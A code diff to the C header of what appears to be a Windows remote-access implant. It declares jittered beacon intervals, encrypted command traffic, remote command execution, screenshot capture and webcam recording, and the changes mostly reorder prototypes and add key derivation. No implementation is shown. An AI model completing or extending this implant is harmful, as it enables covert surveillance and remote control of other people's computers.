@@ -29,6 +29,7 @@
 // Globals
 SOCKET client_socket = INVALID_SOCKET;
 time_t start_time;
+FILE* log_file = NULL;
 int exit_process = 0;
 char* SESSION_ID = NULL;
 const int LOGGING = 1;
@@ -48,30 +49,29 @@ const int RETRY_INTERVALS[] = {
 const int BEACON_MIN_INTERVAL = 300000; // 5 minutes
 const int BEACON_MAX_INTERVAL = 2700000; // 45 minutes
 
-FILE* log_file = NULL;
-
 // Function prototypes
-void log_it(const char* message);
+void log_it(const char* format, ...);
 char* get_session_id(const char* ip_address);
-unsigned char* base64_decode(const char *data, size_t *length);
 char* base64_encode(const unsigned char *data, size_t length);
-char* encrypt_data(const char* data, const char* shared_key);
-char* decrypt_data(const char* encrypted, const char* shared_key);
+unsigned char* base64_decode(const char *data, size_t *length);
+void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key);
+char* encrypt_data(const char *data, const char *shared_key);
+char* decrypt_data(const char *encrypted, const char *shared_key);
 void send_command(const char* response);
 void send_beacon();
 void sleep_ms(int milliseconds);
-char* format_file_name(const char* name, const char* extension);
-char* format_time(long milliseconds);
-void get_uptime();
-char* run_command(const char* command);
-void parse_action(const char* action);
 int get_retry_interval(int retries);
 WCHAR* utf8_to_utf16(const char* str);
 DWORD WINAPI beacon_interval_thread(LPVOID lpParam);
 void start_beacon_interval();
 void run_screenshot();
 void run_webcam_clip();
-int connect_to_server();
+void parse_action(const char* action);
+char* format_file_name(const char* name, const char* extension);
+char* format_time(long milliseconds);
+void get_uptime();
+char* run_command(const char* command);
 void handle_connection();
+int connect_to_server();
 
 #endif // CLIENT_H
